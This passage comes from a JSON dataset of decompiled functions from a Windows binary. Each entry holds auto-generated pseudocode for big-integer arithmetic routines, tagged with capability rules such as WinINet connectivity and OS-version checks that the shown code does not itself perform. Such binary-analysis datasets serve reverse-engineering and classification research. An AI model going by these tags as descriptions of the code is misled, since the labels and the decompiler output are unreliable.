uint var_fech;\n    uint var_fe8h;\n    int32_t var_fe4h;\n    uint var_fe0h;\n    uint var_fdch;\n    uint var_fd8h;\n    uint var_fd4h;\n    uint *var_fd0h;\n    uint var_fcch;\n    uint var_fc8h;\n    uint var_ca0h;\n    uint var_c9ch;\n    int32_t var_978h;\n    uint var_974h;\n    int32_t var_658h;\n    int32_t var_650h;\n    uint var_64ch;\n    int32_t aiStack1612 [198];\n    int32_t var_330h;\n    uint uStack816;\n    uint var_328h;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint32_t uStack28;\n    uint uStack24;\n    uint var_4h;\n    \n    fcn.00419aa0();\n    var_fe4h = arg_8h + 1;\n    puVar7 = &fcn.00402cb0::var_328h;\n    for (iVar10 = 200; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    uStack24 = 0x402d07;\n    puVar6 = fcn.00406657();\n    iVar10 = var_fe4h;\n    puVar7 = puVar6;\n    if (0 < var_fe4h) {\n        for (; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    iVar10 = 0;\n    uVar11 = 0x80000000;\n    var_ff0h = 0;\n    do {\n        if ((uVar11 & *(&stack0x00000328 + in_stack_00000328 * 4)) != 0) break;\n        iVar10 = iVar10 + 1;\n        uVar11 = uVar11 >> 1;\n    } while (uVar11 != 0);\n    iVar13 = 0;\n    if (0 < arg_8h) {\n        puVar7 = puVar6;\n        do {\n            *puVar7 = *((&fcn.00402cb0::arg_ch - puVar6) + puVar7);\n            iVar13 = iVar13 + 1;\n            puVar7 = puVar7 + 1;\n        } while (iVar13 < arg_8h);\n    }\n    uStack24 = 0x402d74;\n    fcn.00402a80(iVar10);\n    uStack24 = 0x402d89;\n    puVar7 = fcn.00402970(iVar10);\n    puVar8 = &stack0x00000328;\n    for (iVar13 = 0xc9; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    var_fe4h = var_fe4h - in_stack_00000328;\n    uVar3 = *(&stack0x00000324 + in_stack_00000328 * 4);\n    iVar13 = in_stack_00000328 + 1;\n    uVar11 = *(&stack0x00000328 + in_stack_00000328 * 4);\n    uStack24 = 0x402dea;\n    puVar8 = fcn.00406657();\n    iVar12 = iVar13;\n    puVar7 = puVar8;\n    if (0 < iVar13) {\n        for (; iVar12 != 0; iVar12 = iVar12 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    if (0 < var_fe4h) {\n        puVar7 = puVar6 + arg_8h;\n        var_fd0h = puVar8;\ncode_r0x00402e30:\n        uStack36 = puVar7[-1];\n        uStack24 = 0;\n        uStack32 = *puVar7;\n        uStack40 = 0x402e44;\n        uStack28 = uVar11;\n        uVar18 = fcn.00419830();\n        uVar16 = extraout_ECX_00;\n        do {\n            if (uVar18 != 0x100000000) {\n                uVar4 = puVar7[-2];\n                uStack36 = 0x402e8f;\n                uStack28 = uVar18 >> 0x20;\n                uStack24 = uVar3;\n                uVar19 = fcn.00419930();\n                if (uVar19 <= CONCAT44(uVar16, uVar4)) break;\n            }\n            uVar18 = uVar18 - 1;\n            bVar17 = CARRY4(uVar16, uVar11);\n            uVar16 = uVar16 + uVar11;\n            var_fd0h = var_fd0h + bVar17;\n        } while (var_fd0h == NULL);\n        var_fd0h = uVar18;\n        iVar12 = 0;\n        puVar14 = puVar7;\n        if (0 < iVar13) {\n            do {\n                puVar8[iVar12] = *puVar14;\n                iVar12 = iVar12 + 1;\n                puVar14 = puVar14 + -1;\n            } while (iVar12 < iVar13);\n        }\n        puVar14 = &fcn.00402cb0::var_64ch;\n        for (iVar12 = 200; iVar12 != 0; iVar12 = iVar12 + -1) {\n            *puVar14 = 0;\n            puVar14 = puVar14 + 1;\n        }\n        var_650h = iVar13;\n        if (200 < iVar13) {\n            var_650h = 200;\n        }\n        iVar12 = var_650h + -1;\n        iVar9 = var_650h;\n        if (-1 < iVar12) {\n            puVar14 = &fcn.00402cb0::var_64ch;\n            do {\n                puVar1 = puVar8 + iVar12;\n                iVar12 = iVar12 + -1;\n                *puVar14 = *puVar1;\n                puVar14 = puVar14 + 1;\n                iVar9 = var_650h;\n            } while (-1 < iVar12);\n        }\n        while ((1 < iVar9 && ((&fcn.00402cb0::var_650h)[iVar9] == 0))) {\n            var_650h = iVar9 + -1;\n            iVar9 = iVar9 + -1;\n        }\n        puVar14 = &stack0xfffffcd0;\n        for (iVar12 = 200; iVar12 != 0; iVar12 = iVar12 + -1) {\n            *puVar14 = 0;\n            puVar14 = puVar14 + 1;\n        }\n        var_330h = 0;\n        if (uVar18 != 0) {\n            do {\n                uVar16 = uVar18 >> 0x20;\n                if (199 < var_330h) break;\n                *(&stack0xfffffcd0 + var_330h * 4) = uVar18;\n                var_330h = var_330h + 1;\n                uVar18 = uVar16;\n            } while (uVar16 != 0);\n            if (var_330h != 0) goto code_r0x00402fc4;\n        }\n        var_330h = 1;\ncode_r0x00402fc4:\n        puVar14 = &fcn.00402cb0::var_650h;\n        var_650h = iVar9;\n        for (iVar12 = 200; iVar12 != 0; iVar12 = iVar12 + -1) {\n            *puVar14 = 0;\n            puVar14 = puVar14 + 1;\n        }\n        iVar12 = 0;\n        puVar14 = &fcn.00402cb0::var_650h;\n        if (0 < in_stack_00000328) {\n            do {\n                *puVar14 = *(&stack0x0000032c + iVar12 * 4);\n                iVar12 = iVar12 + 1;\n                puVar14 = puVar14 + 1;\n            } while (iVar12 < in_stack_00000328);\n        }\n        var_658h = 0x40300f;\n        fcn.00402660(in_stack_00000328, var_650h);\n        iVar12 = var_330h;\n        do {\n            if (var_658h < 0) {\n                if (-1 < iVar12) goto code_r0x00403036;\ncode_r0x004030ca:\n                iVar5 = iVar9;\n                if (iVar9 < var_978h) {\n                    iVar5 = var_978h;\n                }\n                do {\n                    iVar5 = iVar5 + -1;\n                    if (iVar5 < 0) goto code_r0x00403036;\n                } while ((&fcn.00402cb0::var_974h)[iVar5] == (&fcn.00402cb0::var_64ch)[iVar5]);\n                if ((iVar5 < 0) ||\n                   ((&fcn.00402cb0::var_974h)[iVar5] < (&fcn.00402cb0::var_64ch)[iVar5] ||\n                    (&fcn.00402cb0::var_974h)[iVar5] == (&fcn.00402cb0::var_64ch)[iVar5])) goto code_r0x00403036;\n            }\n            else if (-1 < iVar12) goto code_r0x004030ca;\n            var_fd0h = var_fd0h + -1;\n            uStack24 = 0x40314f;\n            fcn.00402480(&stack0x00000328);\n        } while( true );\n    }\n    var_ff0h = 0;\ncode_r0x00403159:\n    iVar13 = var_ff0h + -1;\n    *extraout_ECX = var_ff0h;\n    iVar12 = 0;\n    piVar15 = extraout_ECX;\n    if (iVar13 < 0) {\ncode_r0x0040318a:\n        piVar15 = extraout_ECX + iVar12;\n        for (iVar12 = 200 - iVar12; piVar15 = piVar15 + 1,  iVar12 != 0; iVar12 = iVar12 + -1) {\n            *piVar15 = 0;\n        }\n    }\n    else {\n        do {\n            piVar15 = piVar15 + 1;\n            piVar2 = &fcn.00402cb0::var_328h + iVar13;\n            iVar13 = iVar13 + -1;\n            *piVar15 = *piVar2;\n        } while (-1 < iVar13);\n        iVar12 = var_ff0h;\n        if (var_ff0h < 200) goto code_r0x0040318a;\n    }\n    iVar13 = *extraout_ECX;\n    while ((1 < iVar13 && (extraout_ECX[*extraout_ECX] == 0))) {\n        iVar13 = *extraout_ECX + -1;\n        *extraout_ECX = iVar13;\n    }\n    if (*extraout_ECX == 0) {\n        *extraout_ECX = 1;\n    }\n    uStack24 = 0x4031da;\n    iVar10 = fcn.00402b40(iVar10);\n    iVar13 = 0;\n    *extraout_EDX = iVar10;\n    piVar15 = extraout_EDX;\n    if (0 < iVar10) {\n        do {\n            piVar15 = piVar15 + 1;\n            *piVar15 = puVar6[iVar13];\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < *extraout_EDX);\n        if (199 < iVar13) goto code_r0x00403217;\n    }\n    piVar15 = extraout_EDX + iVar13;\n    for (iVar13 = 200 - iVar13; piVar15 = piVar15 + 1,  iVar13 != 0; iVar13 = iVar13 + -1) {\n        *piVar15 = 0;\n    }\ncode_r0x00403217:\n    if (puVar6 != NULL) {\n        uStack24 = 0x403221;\n        fcn.00406652();\n    }\n    if (puVar8 != NULL) {\n        uStack24 = 0x40322e;\n        fcn.00406652();\n    }\n    fcn.0040640a(unaff_EBP);\n    return;\ncode_r0x00403036:\n    uStack24 = 0x40304e;\n    fcn.00402390(&fcn.00402cb0::var_978h);\n    iVar12 = 0;\n    puVar14 = puVar7;\n    if (0 < iVar13) {\n        do {\n            iVar9 = in_stack_00000328 - iVar12;\n            iVar12 = iVar12 + 1;\n            *puVar14 = (&fcn.00402cb0::var_c9ch)[iVar9];\n            puVar14 = puVar14 + -1;\n        } while (iVar12 < iVar13);\n    }\n    var_fe4h = var_fe4h + -1;\n    puVar7 = puVar7 + -1;\n    (&fcn.00402cb0::var_328h)[var_ff0h] = var_fd0h;\n    var_ff0h = var_ff0h + 1;\n    if (var_fe4h < 1) goto code_r0x00403159;\n    goto code_r0x00402e30;\n}\n",
        "token_count": 3376
    },
    "00403250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403250(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    uint32_t *in_ECX;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    bool bVar9;\n    uint32_t in_stack_0000032c;\n    uint in_stack_fffffcb0;\n    uint var_33ch;\n    uint var_334h;\n    uint var_330h;\n    uint32_t var_32ch;\n    uint var_328h;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    piVar5 = &arg_ch;\n    piVar6 = in_EDX + 1;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *piVar6 = *piVar5;\n        piVar5 = piVar5 + 1;\n        piVar6 = piVar6 + 1;\n    }\n    *in_EDX = arg_8h;\n    if (1 < arg_8h) {\n        do {\n            if (in_EDX[*in_EDX] != 0) break;\n            iVar3 = *in_EDX + -1;\n            *in_EDX = iVar3;\n        } while (1 < iVar3);\n    }\n    iVar3 = *in_EDX;\n    bVar9 = in_stack_0000032c <= in_EDX[iVar3];\n    if (bVar9) {\n        in_stack_fffffcb0 = 0;\n        var_328h = fcn.00419830(in_EDX[iVar3], 0);\n        in_EDX[iVar3] = extraout_ECX;\n    }\n    var_32ch = bVar9;\n    uVar4 = bVar9;\n    iVar7 = iVar3 + -2;\n    if (-1 < iVar7) {\n        piVar5 = in_EDX + iVar3 + -1;\n        do {\n            uVar2 = fcn.00419830(*piVar5, piVar5[1], in_stack_0000032c, 0, var_32ch);\n            piVar5[1] = 0;\n            (&var_328h)[var_32ch] = uVar2;\n            uVar4 = var_32ch + 1;\n            iVar7 = iVar7 + -1;\n            *piVar5 = extraout_ECX_00;\n            piVar5 = piVar5 + -1;\n            var_32ch = uVar4;\n        } while (-1 < iVar7);\n    }\n    iVar3 = uVar4 - 1;\n    *in_ECX = uVar4;\n    puVar8 = in_ECX;\n    if (iVar3 < 0) {\n        uVar4 = 0;\n    }\n    else {\n        do {\n            puVar1 = &var_328h + iVar3;\n            iVar3 = iVar3 + -1;\n            puVar8[1] = *puVar1;\n            puVar8 = puVar8 + 1;\n        } while (-1 < iVar3);\n        if (199 < uVar4) goto code_r0x0040339f;\n    }\n    puVar8 = in_ECX + uVar4 + 1;\n    for (iVar3 = 200 - uVar4; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\ncode_r0x0040339f:\n    uVar4 = *in_ECX;\n    while ((1 < uVar4 && (in_ECX[*in_ECX] == 0))) {\n        uVar4 = *in_ECX - 1;\n        *in_ECX = uVar4;\n    }\n    if (*in_ECX == 0) {\n        *in_ECX = 1;\n    }\n    iVar3 = *in_EDX;\n    while ((1 < iVar3 && (in_EDX[*in_EDX] == 0))) {\n        iVar3 = *in_EDX + -1;\n        *in_EDX = iVar3;\n    }\n    fcn.0040640a(in_stack_fffffcb0);\n    return;\n}\n",
        "token_count": 1018
    },
    "004033f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004033f0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_stack_00000324;\n    int32_t in_stack_00000328;\n    int32_t in_stack_00000648;\n    uint in_stack_fffff020;\n    uint auStack3260 [199];\n    uint uStack2464;\n    uint in_stack_fffff670;\n    char var_982h;\n    uint var_981h;\n    uint var_658h;\n    uint var_654h;\n    int32_t var_330h;\n    uint var_32ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    var_981h._0_1_ = '\\0';\n    var_982h = '\\0';\n    puVar1 = &fcn.004033f0::var_32ch;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    }\n    puVar1 = &fcn.004033f0::var_654h;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    }\n    var_330h = 1;\n    if (in_stack_00000324 < 0) {\n        uStack2464 = 0x40345a;\n        puVar1 = fcn.00402510();\n        var_982h = '\\x01';\n        puVar5 = &fcn.004033f0::arg_8h;\n        for (iVar2 = 0xc9; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    if (in_stack_00000648 < 0) {\n        uStack2464 = 0x403488;\n        puVar1 = fcn.00402510();\n        var_981h._0_1_ = '\\x01';\n        puVar5 = &stack0x00000328;\n        for (iVar2 = 0xc9; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    if (in_stack_00000324 < 0) {\n        if (-1 < in_stack_00000648) goto code_r0x0040359a;\n    }\n    else if (in_stack_00000648 < 0) goto code_r0x004034e6;\n    iVar2 = in_stack_00000328;\n    if (in_stack_00000328 < arg_8h) {\n        iVar2 = arg_8h;\n    }\n    do {\n        iVar2 = iVar2 + -1;\n        if (iVar2 < 0) goto code_r0x004034e6;\n    } while ((&fcn.004033f0::arg_ch)[iVar2] == *(&stack0x0000032c + iVar2 * 4));\n    if ((-1 < iVar2) && ((&fcn.004033f0::arg_ch)[iVar2] < *(&stack0x0000032c + iVar2 * 4))) {\ncode_r0x0040359a:\n        piVar3 = in_ECX + 1;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *piVar3 = 0;\n            piVar3 = piVar3 + 1;\n        }\n        *in_ECX = 1;\n        iVar2 = 0;\n        piVar3 = in_ECX + 1;\n        do {\n            *piVar3 = (&fcn.004033f0::var_32ch)[iVar2];\n            iVar2 = iVar2 + 1;\n            piVar3 = piVar3 + 1;\n        } while (iVar2 < *in_ECX);\n        fcn.0040640a(in_stack_fffff670);\n        return;\n    }\ncode_r0x004034e6:\n    puVar1 = &stack0xfffff344;\n    puVar5 = puVar1;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if (in_stack_00000328 == 1) {\n        iVar2 = 0;\n        do {\n            *puVar1 = *(&stack0x0000032c + iVar2 * 4);\n            iVar2 = iVar2 + 1;\n            puVar1 = puVar1 + 1;\n        } while (iVar2 < 1);\n        iVar4 = 0;\n        puVar1 = &stack0xfffff020;\n        puVar5 = puVar1;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        if (0 < arg_8h) {\n            do {\n                *puVar1 = (&fcn.004033f0::arg_ch)[iVar4];\n                iVar4 = iVar4 + 1;\n                puVar1 = puVar1 + 1;\n            } while (iVar4 < arg_8h);\n        }\n        fcn.00403250(arg_8h, in_stack_fffff020);\n    }\n    else {\n        iVar2 = 0;\n        if (0 < in_stack_00000328) {\n            do {\n                *puVar1 = *(&stack0x0000032c + iVar2 * 4);\n                iVar2 = iVar2 + 1;\n                puVar1 = puVar1 + 1;\n            } while (iVar2 < in_stack_00000328);\n        }\n        iVar4 = 0;\n        puVar1 = &stack0xfffff020;\n        puVar5 = puVar1;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        if (0 < arg_8h) {\n            do {\n                *puVar1 = (&fcn.004033f0::arg_ch)[iVar4];\n                iVar4 = iVar4 + 1;\n                puVar1 = puVar1 + 1;\n            } while (iVar4 < arg_8h);\n        }\n        fcn.00402cb0(arg_8h, in_stack_fffff020);\n    }\n    if (var_982h == var_981h) {\n        piVar3 = in_ECX + 1;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *piVar3 = 0;\n            piVar3 = piVar3 + 1;\n        }\n        iVar2 = 0;\n        *in_ECX = var_330h;\n        piVar3 = in_ECX + 1;\n        if (0 < var_330h) {\n            do {\n                *piVar3 = (&fcn.004033f0::var_32ch)[iVar2];\n                iVar2 = iVar2 + 1;\n                piVar3 = piVar3 + 1;\n            } while (iVar2 < *in_ECX);\n        }\n        fcn.0040640a(in_stack_fffff670);\n        return;\n    }\n    uStack2464 = 0x403661;\n    fcn.00402510();\n    fcn.0040640a(in_stack_fffff670);\n    return;\n}\n",
        "token_count": 1846
    },
    "004036c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004036c0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    int32_t in_stack_00000324;\n    int32_t in_stack_00000328;\n    int32_t in_stack_00000648;\n    uint in_stack_fffff020;\n    uint auStack3260 [199];\n    uint uStack2464;\n    uint in_stack_fffff670;\n    uint var_981h;\n    uint var_658h;\n    uint var_654h;\n    int32_t var_330h;\n    uint var_32ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    puVar1 = &fcn.004036c0::var_654h;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    }\n    puVar1 = &fcn.004036c0::var_32ch;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    }\n    iVar2 = 0;\n    var_330h = arg_8h;\n    if (0 < arg_8h) {\n        do {\n            (&fcn.004036c0::var_32ch)[iVar2] = (&fcn.004036c0::arg_ch)[iVar2];\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < arg_8h);\n    }\n    var_981h._0_1_ = '\\0';\n    if (in_stack_00000324 < 0) {\n        uStack2464 = 0x403742;\n        puVar1 = fcn.00402510();\n        var_981h._0_1_ = '\\x01';\n        puVar5 = &fcn.004036c0::arg_8h;\n        for (iVar2 = 0xc9; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    if (in_stack_00000648 < 0) {\n        uStack2464 = 0x403773;\n        puVar1 = fcn.00402510();\n        puVar5 = &stack0x00000328;\n        for (iVar2 = 0xc9; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    if (in_stack_00000324 < 0) {\n        if (in_stack_00000648 < 0) {\ncode_r0x004037a8:\n            iVar2 = in_stack_00000328;\n            if (in_stack_00000328 < arg_8h) {\n                iVar2 = arg_8h;\n            }\n            do {\n                iVar2 = iVar2 + -1;\n                if (iVar2 < 0) goto code_r0x004037ca;\n            } while ((&fcn.004036c0::arg_ch)[iVar2] == *(&stack0x0000032c + iVar2 * 4));\n            if ((iVar2 < 0) || (*(&stack0x0000032c + iVar2 * 4) <= (&fcn.004036c0::arg_ch)[iVar2]))\n            goto code_r0x004037ca;\n        }\n        piVar3 = in_ECX + 1;\n        piVar6 = piVar3;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        iVar2 = 0;\n        *in_ECX = var_330h;\n        if (0 < var_330h) {\n            do {\n                *piVar3 = (&fcn.004036c0::var_32ch)[iVar2];\n                iVar2 = iVar2 + 1;\n                piVar3 = piVar3 + 1;\n            } while (iVar2 < *in_ECX);\n            fcn.0040640a(in_stack_fffff670);\n            return;\n        }\n    }\n    else {\n        if (-1 < in_stack_00000648) goto code_r0x004037a8;\ncode_r0x004037ca:\n        puVar1 = &stack0xfffff344;\n        puVar5 = puVar1;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        if (in_stack_00000328 == 1) {\n            iVar2 = 0;\n            do {\n                *puVar1 = *(&stack0x0000032c + iVar2 * 4);\n                iVar2 = iVar2 + 1;\n                puVar1 = puVar1 + 1;\n            } while (iVar2 < 1);\n            iVar4 = 0;\n            puVar1 = &stack0xfffff020;\n            puVar5 = puVar1;\n            for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            if (0 < arg_8h) {\n                do {\n                    *puVar1 = (&fcn.004036c0::arg_ch)[iVar4];\n                    iVar4 = iVar4 + 1;\n                    puVar1 = puVar1 + 1;\n                } while (iVar4 < arg_8h);\n            }\n            fcn.00403250(arg_8h, in_stack_fffff020);\n        }\n        else {\n            iVar2 = 0;\n            if (0 < in_stack_00000328) {\n                do {\n                    *puVar1 = *(&stack0x0000032c + iVar2 * 4);\n                    iVar2 = iVar2 + 1;\n                    puVar1 = puVar1 + 1;\n                } while (iVar2 < in_stack_00000328);\n            }\n            iVar4 = 0;\n            puVar1 = &stack0xfffff020;\n            puVar5 = puVar1;\n            for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            if (0 < arg_8h) {\n                do {\n                    *puVar1 = (&fcn.004036c0::arg_ch)[iVar4];\n                    iVar4 = iVar4 + 1;\n                    puVar1 = puVar1 + 1;\n                } while (iVar4 < arg_8h);\n            }\n            fcn.00402cb0(arg_8h, in_stack_fffff020);\n        }\n        if (var_981h != '\\0') {\n            uStack2464 = 0x40394c;\n            fcn.00402510();\n            fcn.0040640a(in_stack_fffff670);\n            return;\n        }\n        piVar3 = in_ECX + 1;\n        piVar6 = piVar3;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        iVar2 = 0;\n        *in_ECX = var_330h;\n        if (0 < var_330h) {\n            do {\n                *piVar3 = (&fcn.004036c0::var_32ch)[iVar2];\n                iVar2 = iVar2 + 1;\n                piVar3 = piVar3 + 1;\n            } while (iVar2 < *in_ECX);\n        }\n    }\n    fcn.0040640a(in_stack_fffff670);\n    return;\n}\n",
        "token_count": 1916
    },
    "004039b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403a22)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004039b0(int32_t *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint *puVar7;\n    int32_t in_stack_0000032c;\n    uint32_t in_stack_0000064c;\n    uint in_stack_ffffe368;\n    uint auStack6516 [198];\n    uint uStack5724;\n    uint in_stack_ffffe9ac;\n    uint in_stack_ffffe9b0;\n    uint in_stack_ffffecd0;\n    uint in_stack_ffffecd4;\n    uint in_stack_ffffecd8;\n    int32_t aiStack4104 [199];\n    uint uStack3308;\n    uint in_stack_fffff324;\n    int32_t var_cd4h;\n    int32_t var_cd0h;\n    int32_t var_ccch;\n    uint32_t *var_cc8h;\n    uint32_t var_cc4h;\n    int32_t var_cc0h;\n    int32_t *var_cbch;\n    int32_t var_cb8h;\n    uint var_cadh;\n    int32_t iStack2496;\n    uint auStack2492 [13];\n    int32_t var_984h;\n    int32_t var_980h;\n    int32_t iStack1692;\n    uint auStack1688 [14];\n    int32_t var_65ch;\n    uint var_658h;\n    int32_t var_334h;\n    uint var_330h;\n    uint32_t var_8h;\n    \n    var_8h = *0x424008 ^ &stack0xfffffffc;\n    var_cbch = arg_8h;\n    puVar2 = &fcn.004039b0::var_330h;\n    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_330h = 1;\n    var_cadh._0_1_ = '\\0';\n    var_cc0h = 1;\n    var_334h = 1;\n    iVar4 = 200;\n    if (in_ECX[200] < 0) {\n        puVar2 = &stack0xffffeff8;\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar4 = 0;\n        puVar2 = &stack0xffffeff8;\n        if (0 < in_stack_0000032c) {\n            do {\n                *puVar2 = *(&stack0x00000330 + iVar4 * 4);\n                iVar4 = iVar4 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < in_stack_0000032c);\n        }\n        fcn.00402510();\n        puVar2 = fcn.004036c0(in_stack_ffffecd0, in_stack_ffffecd4);\n        var_cadh._0_1_ = '\\x01';\n    }\n    else {\n        puVar2 = &stack0xffffeff8;\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar4 = 0;\n        puVar2 = &stack0xffffeff8;\n        if (0 < in_stack_0000032c) {\n            do {\n                *puVar2 = *(&stack0x00000330 + iVar4 * 4);\n                iVar4 = iVar4 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < in_stack_0000032c);\n        }\n        puVar2 = &stack0xffffecd4;\n        for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar4 = *in_ECX;\n        iVar5 = 0;\n        if (0 < iVar4) {\n            puVar2 = &stack0xffffecd4;\n            do {\n                *puVar2 = *((in_ECX - &stack0xffffecd0) + puVar2);\n                iVar5 = iVar5 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar5 < iVar4);\n        }\n        puVar2 = fcn.004036c0(iVar4, in_stack_ffffecd4);\n    }\n    puVar7 = &fcn.004039b0::var_984h;\n    for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    if ((in_stack_0000064c & 0x80000000) != 0) {\n        uStack3308 = 0x403b3b;\n        puVar2 = fcn.00402510();\n        puVar7 = &stack0x0000032c;\n        for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar7 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    puVar2 = &fcn.004039b0::var_658h;\n    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (&fcn.004039b0::var_658h)[in_stack_0000032c * 2] = 1;\n    iVar4 = in_stack_0000032c * 2 + 1;\n    var_65ch = iVar4;\n    puVar2 = &stack0xffffeff8;\n    for (iVar5 = 200; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    iVar5 = 0;\n    puVar2 = &stack0xffffeff8;\n    if (0 < in_stack_0000032c) {\n        do 